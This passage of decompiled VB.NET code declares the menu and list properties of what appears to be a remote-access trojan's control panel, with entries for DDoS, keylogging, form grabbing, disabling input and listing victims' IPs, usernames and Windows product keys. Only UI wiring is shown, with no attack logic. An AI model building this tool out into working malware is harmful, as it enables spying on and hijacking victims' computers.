            Set(ByVal value As ContextMenuStrip)
                Me._ContextMenuStrip1 = value
            End Set
        End Property

        Friend Overridable Property ContextMenuStrip2 As ContextMenuStrip
            Get
                Return Me._ContextMenuStrip2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ContextMenuStrip)
                Me._ContextMenuStrip2 = value
            End Set
        End Property

        Friend Overridable Property ContextMenuStrip3 As ContextMenuStrip
            Get
                Return Me._ContextMenuStrip3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ContextMenuStrip)
                Me._ContextMenuStrip3 = value
            End Set
        End Property

        Friend Overridable Property CountryToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._CountryToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CountryToolStripMenuItem_Click)
                If (Not Me._CountryToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._CountryToolStripMenuItem.Click, handler
                End If
                Me._CountryToolStripMenuItem = value
                If (Not Me._CountryToolStripMenuItem Is Nothing) Then
                    AddHandler Me._CountryToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property DDOSToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._DDOSToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._DDOSToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property DisableMouseAndKeyboardToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._DisableMouseAndKeyboardToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.DisableMouseAndKeyboardToolStripMenuItem_Click)
                If (Not Me._DisableMouseAndKeyboardToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._DisableMouseAndKeyboardToolStripMenuItem.Click, handler
                End If
                Me._DisableMouseAndKeyboardToolStripMenuItem = value
                If (Not Me._DisableMouseAndKeyboardToolStripMenuItem Is Nothing) Then
                    AddHandler Me._DisableMouseAndKeyboardToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property EnableMouseAndKeyboardToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._EnableMouseAndKeyboardToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.EnableMouseAndKeyboardToolStripMenuItem_Click)
                If (Not Me._EnableMouseAndKeyboardToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._EnableMouseAndKeyboardToolStripMenuItem.Click, handler
                End If
                Me._EnableMouseAndKeyboardToolStripMenuItem = value
                If (Not Me._EnableMouseAndKeyboardToolStripMenuItem Is Nothing) Then
                    AddHandler Me._EnableMouseAndKeyboardToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property EToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._EToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._EToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property ExitToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ExitToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ExitToolStripMenuItem_Click)
                If (Not Me._ExitToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ExitToolStripMenuItem.Click, handler
                End If
                Me._ExitToolStripMenuItem = value
                If (Not Me._ExitToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ExitToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ExitToolStripMenuItem1 As ToolStripMenuItem
            Get
                Return Me._ExitToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ExitToolStripMenuItem1_Click)
                If (Not Me._ExitToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._ExitToolStripMenuItem1.Click, handler
                End If
                Me._ExitToolStripMenuItem1 = value
                If (Not Me._ExitToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._ExitToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ExtensionChangerToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ExtensionChangerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ExtensionChangerToolStripMenuItem_Click)
                If (Not Me._ExtensionChangerToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ExtensionChangerToolStripMenuItem.Click, handler
                End If
                Me._ExtensionChangerToolStripMenuItem = value
                If (Not Me._ExtensionChangerToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ExtensionChangerToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ExtraToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ExtraToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.method_14)
                Dim handler2 As EventHandler = New EventHandler(AddressOf Me.method_13)
                If (Not Me._ExtraToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ExtraToolStripMenuItem.MouseLeave, handler
                    RemoveHandler Me._ExtraToolStripMenuItem.MouseEnter, handler2
                End If
                Me._ExtraToolStripMenuItem = value
                If (Not Me._ExtraToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ExtraToolStripMenuItem.MouseLeave, handler
                    AddHandler Me._ExtraToolStripMenuItem.MouseEnter, handler2
                End If
            End Set
        End Property

        Friend Overridable Property FacebookToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._FacebookToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._FacebookToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property FileManagerToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._FileManagerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.FileManagerToolStripMenuItem_Click)
                If (Not Me._FileManagerToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._FileManagerToolStripMenuItem.Click, handler
                End If
                Me._FileManagerToolStripMenuItem = value
                If (Not Me._FileManagerToolStripMenuItem Is Nothing) Then
                    AddHandler Me._FileManagerToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property FileToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._FileToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.method_16)
                Dim handler2 As EventHandler = New EventHandler(AddressOf Me.method_15)
                If (Not Me._FileToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._FileToolStripMenuItem.MouseLeave, handler
                    RemoveHandler Me._FileToolStripMenuItem.MouseEnter, handler2
                End If
                Me._FileToolStripMenuItem = value
                If (Not Me._FileToolStripMenuItem Is Nothing) Then
                    AddHandler Me._FileToolStripMenuItem.MouseLeave, handler
                    AddHandler Me._FileToolStripMenuItem.MouseEnter, handler2
                End If
            End Set
        End Property

        Friend Overridable Property FixMouseButtonToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._FixMouseButtonToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.FixMouseButtonToolStripMenuItem_Click)
                If (Not Me._FixMouseButtonToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._FixMouseButtonToolStripMenuItem.Click, handler
                End If
                Me._FixMouseButtonToolStripMenuItem = value
                If (Not Me._FixMouseButtonToolStripMenuItem Is Nothing) Then
                    AddHandler Me._FixMouseButtonToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property FormGrabberToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._FormGrabberToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.FormGrabberToolStripMenuItem_Click)
                If (Not Me._FormGrabberToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._FormGrabberToolStripMenuItem.Click, handler
                End If
                Me._FormGrabberToolStripMenuItem = value
                If (Not Me._FormGrabberToolStripMenuItem Is Nothing) Then
                    AddHandler Me._FormGrabberToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property FreezeToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._FreezeToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._FreezeToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property FunStuffToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._FunStuffToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._FunStuffToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property GetIPToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._GetIPToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.GetIPToolStripMenuItem_Click)
                If (Not Me._GetIPToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._GetIPToolStripMenuItem.Click, handler
                End If
                Me._GetIPToolStripMenuItem = value
                If (Not Me._GetIPToolStripMenuItem Is Nothing) Then
                    AddHandler Me._GetIPToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property getloggg As TextBox
            Get
                Return Me._getloggg
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._getloggg = value
            End Set
        End Property

        Friend Overridable Property GetRecordToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._GetRecordToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.GetRecordToolStripMenuItem_Click)
                If (Not Me._GetRecordToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._GetRecordToolStripMenuItem.Click, handler
                End If
                Me._GetRecordToolStripMenuItem = value
                If (Not Me._GetRecordToolStripMenuItem Is Nothing) Then
                    AddHandler Me._GetRecordToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property HideShowColumsToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._HideShowColumsToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._HideShowColumsToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property HideTaskbarToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._HideTaskbarToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.HideTaskbarToolStripMenuItem_Click)
                If (Not Me._HideTaskbarToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._HideTaskbarToolStripMenuItem.Click, handler
                End If
                Me._HideTaskbarToolStripMenuItem = value
                If (Not Me._HideTaskbarToolStripMenuItem Is Nothing) Then
                    AddHandler Me._HideTaskbarToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ImageList1 As ImageList
            Get
                Return Me.imageList_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ImageList)
                Me.imageList_0 = value
            End Set
        End Property

        Friend Overridable Property IPAdressToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._IPAdressToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.IPAdressToolStripMenuItem_Click)
                If (Not Me._IPAdressToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._IPAdressToolStripMenuItem.Click, handler
                End If
                Me._IPAdressToolStripMenuItem = value
                If (Not Me._IPAdressToolStripMenuItem Is Nothing) Then
                    AddHandler Me._IPAdressToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property KeyloggzeToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._KeyloggzeToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.KeyloggzeToolStripMenuItem_Click)
                If (Not Me._KeyloggzeToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._KeyloggzeToolStripMenuItem.Click, handler
                End If
                Me._KeyloggzeToolStripMenuItem = value
                If (Not Me._KeyloggzeToolStripMenuItem Is Nothing) Then
                    AddHandler Me._KeyloggzeToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property KillToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._KillToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.KillToolStripMenuItem_Click)
                If (Not Me._KillToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._KillToolStripMenuItem.Click, handler
                End If
                Me._KillToolStripMenuItem = value
                If (Not Me._KillToolStripMenuItem Is Nothing) Then
                    AddHandler Me._KillToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Label2 As Label
            Get
                Return Me._Label2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label2 = value
            End Set
        End Property

        Friend Overridable Property LanToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._LanToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.LanToolStripMenuItem_Click)
                If (Not Me._LanToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._LanToolStripMenuItem.Click, handler
                End If
                Me._LanToolStripMenuItem = value
                If (Not Me._LanToolStripMenuItem Is Nothing) Then
                    AddHandler Me._LanToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ListenToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ListenToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ListenToolStripMenuItem_Click)
                If (Not Me._ListenToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ListenToolStripMenuItem.Click, handler
                End If
                Me._ListenToolStripMenuItem = value
                If (Not Me._ListenToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ListenToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ListToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ListToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ListToolStripMenuItem_Click)
                If (Not Me._ListToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ListToolStripMenuItem.Click, handler
                End If
                Me._ListToolStripMenuItem = value
                If (Not Me._ListToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ListToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ListView1 As ListView
            Get
                Return Me._ListView1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ListView)
                Me._ListView1 = value
            End Set
        End Property

        Friend Overridable Property lstClients As ListView
            Get
                Return Me._lstClients
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ListView)
                Me._lstClients = value
            End Set
        End Property

        Friend Overridable Property lstcountry As ColumnHeader
            Get
                Return Me.columnHeader_9
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ColumnHeader)
                Me.columnHeader_9 = value
            End Set
        End Property

        Friend Overridable Property lstcpname As ColumnHeader
            Get
                Return Me.columnHeader_5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ColumnHeader)
                Me.columnHeader_5 = value
            End Set
        End Property

        Friend Overridable Property lstipaddress As ColumnHeader
            Get
                Return Me.columnHeader_2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ColumnHeader)
                Me.columnHeader_2 = value
            End Set
        End Property

        Friend Overridable Property lstopsys As ColumnHeader
            Get
                Return Me.columnHeader_8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ColumnHeader)
                Me.columnHeader_8 = value
            End Set
        End Property

        Friend Overridable Property lstping As ColumnHeader
            Get
                Return Me.columnHeader_10
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ColumnHeader)
                Me.columnHeader_10 = value
            End Set
        End Property

        Friend Overridable Property lststatus As ColumnHeader
            Get
                Return Me.columnHeader_4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ColumnHeader)
                Me.columnHeader_4 = value
            End Set
        End Property

        Friend Overridable Property lstusername As ColumnHeader
            Get
                Return Me.columnHeader_6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ColumnHeader)
                Me.columnHeader_6 = value
            End Set
        End Property

        Friend Overridable Property lstversion As ColumnHeader
            Get
                Return Me.columnHeader_3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ColumnHeader)
                Me.columnHeader_3 = value
            End Set
        End Property

        Friend Overridable Property lstwinprckey As ColumnHeader
            Get
                Return Me.columnHeader_7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ColumnHeader)
                Me.columnHeader_7 = value
            End Set
        End Property

        Friend Overridable Property MatrixScreenToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._MatrixScreenToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.MatrixScreenToolStripMenuItem_Click)
                If (Not Me._MatrixScreenToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._MatrixScreenToolStripMenuItem.Click, handler
                End If
                Me._MatrixScreenToolStripMenuItem = value
                If (Not Me._MatrixScreenToolStripMenuItem Is Nothing) Then
                    AddHandler Me._MatrixScreenToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property MenuStrip1 As MenuStrip
            Get
                Return Me._MenuStrip1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As MenuStrip)
                Me._MenuStrip1 = value
            End Set
        End Property

        Friend Overridable Property MessageBoxToolStripMenuItem1 As ToolStripMenuItem
            Get
                Return Me._MessageBoxToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.MessageBoxToolStripMenuItem1_Click)
                If (Not Me._MessageBoxToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._MessageBoxToolStripMenuItem1.Click, handler
                End If
                Me._MessageBoxToolStripMenuItem1 = value
                If (Not Me._MessageBoxToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._MessageBoxToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property MsnControlToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._MsnControlToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._MsnControlToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property NoipUpdateToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._NoipUpdateToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.NoipUpdateToolStripMenuItem_Click)
                If (Not Me._NoipUpdateToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._NoipUpdateToolStripMenuItem.Click, handler
                End If
                Me._NoipUpdateToolStripMenuItem = value
                If (Not Me._NoipUpdateToolStripMenuItem Is Nothing) Then
                    AddHandler Me._NoipUpdateToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property NotifyIcon1 As NotifyIcon
            Get
                Return Me.notifyIcon_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As NotifyIcon)
                Dim handler As MouseEventHandler = New MouseEventHandler(AddressOf Me.NotifyIcon1_MouseClick)
                If (Not Me.notifyIcon_0 Is Nothing) Then
                    RemoveHandler Me.notifyIcon_0.MouseClick, handler
                End If
                Me.notifyIcon_0 = value
                If (Not Me.notifyIcon_0 Is Nothing) Then
                    AddHandler Me.notifyIcon_0.MouseClick, handler
                End If
            End Set
        End Property

        Friend Overridable Property NumberOfConnectionsMaxToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._NumberOfConnectionsMaxToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._NumberOfConnectionsMaxToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property OkToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._OkToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OkToolStripMenuItem_Click)
                If (Not Me._OkToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._OkToolStripMenuItem.Click, handler
                End If
                Me._OkToolStripMenuItem = value
                If (Not Me._OkToolStripMenuItem Is Nothing) Then
                    AddHandler Me._OkToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OkToolStripMenuItem1 As ToolStripMenuItem
            Get
                Return Me._OkToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OkToolStripMenuItem1_Click)
                If (Not Me._OkToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._OkToolStripMenuItem1.Click, handler
                End If
                Me._OkToolStripMenuItem1 = value
                If (Not Me._OkToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._OkToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OkToolStripMenuItem2 As ToolStripMenuItem
            Get
                Return Me._OkToolStripMenuItem2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OkToolStripMenuItem2_Click)
                If (Not Me._OkToolStripMenuItem2 Is Nothing) Then
                    RemoveHandler Me._OkToolStripMenuItem2.Click, handler
                End If
                Me._OkToolStripMenuItem2 = value
                If (Not Me._OkToolStripMenuItem2 Is Nothing) Then
                    AddHandler Me._OkToolStripMenuItem2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OkToolStripMenuItem3 As ToolStripMenuItem
            Get
                Return Me._OkToolStripMenuItem3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OkToolStripMenuItem3_Click)
                If (Not Me._OkToolStripMenuItem3 Is Nothing) Then
                    RemoveHandler Me._OkToolStripMenuItem3.Click, handler
                End If
                Me._OkToolStripMenuItem3 = value
                If (Not Me._OkToolStripMenuItem3 Is Nothing) Then
                    AddHandler Me._OkToolStripMenuItem3.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OkToolStripMenuItem4 As ToolStripMenuItem
            Get
                Return Me._OkToolStripMenuItem4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OkToolStripMenuItem4_Click)
                If (Not Me._OkToolStripMenuItem4 Is Nothing) Then
                    RemoveHandler Me._OkToolStripMenuItem4.Click, handler
                End If
                Me._OkToolStripMenuItem4 = value
                If (Not Me._OkToolStripMenuItem4 Is Nothing) Then
                    AddHandler Me._OkToolStripMenuItem4.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OkToolStripMenuItem5 As ToolStripMenuItem
            Get
                Return Me._OkToolStripMenuItem5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OkToolStripMenuItem5_Click)
                If (Not Me._OkToolStripMenuItem5 Is Nothing) Then
                    RemoveHandler Me._OkToolStripMenuItem5.Click, handler
                End If
                Me._OkToolStripMenuItem5 = value
                If (Not Me._OkToolStripMenuItem5 Is Nothing) Then
                    AddHandler Me._OkToolStripMenuItem5.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OkToolStripMenuItem6 As ToolStripMenuItem
            Get
                Return Me._OkToolStripMenuItem6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OkToolStripMenuItem6_Click)
                If (Not Me._OkToolStripMenuItem6 Is Nothing) Then
                    RemoveHandler Me._OkToolStripMenuItem6.Click, handler
                End If
                Me._OkToolStripMenuItem6 = value
                If (Not Me._OkToolStripMenuItem6 Is Nothing) Then
                    AddHandler Me._OkToolStripMenuItem6.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OkToolStripMenuItem7 As ToolStripMenuItem
            Get
                Return Me._OkToolStripMenuItem7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OkToolStripMenuItem7_Click)
                If (Not Me._OkToolStripMenuItem7 Is Nothing) Then
                    RemoveHandler Me._OkToolStripMenuItem7.Click, handler
                End If
                Me._OkToolStripMenuItem7 = value
                If (Not Me._OkToolStripMenuItem7 Is Nothing) Then
                    AddHandler Me._OkToolStripMenuItem7.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OpenCDToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._OpenCDToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OpenCDToolStripMenuItem_Click)
                If (Not Me._OpenCDToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._OpenCDToolStripMenuItem.Click, handler
                End If
                Me._OpenCDToolStripMenuItem = value
                If (Not Me._OpenCDToolStripMenuItem Is Nothing) Then
                    AddHandler Me._OpenCDToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OpenWebsiteToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._OpenWebsiteToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OpenWebsiteToolStripMenuItem_Click)
                If (Not Me._OpenWebsiteToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._OpenWebsiteToolStripMenuItem.Click, handler
                End If
                Me._OpenWebsiteToolStripMenuItem = value
                If (Not Me._OpenWebsiteToolStripMenuItem Is Nothing) Then
                    AddHandler Me._OpenWebsiteToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OSToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._OSToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OSToolStripMenuItem_Click)
                If (Not Me._OSToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._OSToolStripMenuItem.Click, handler
                End If
                Me._OSToolStripMenuItem = value
                If (Not Me._OSToolStripMenuItem Is Nothing) Then
                    AddHandler Me._OSToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox1 = value
            End Set
        End Property

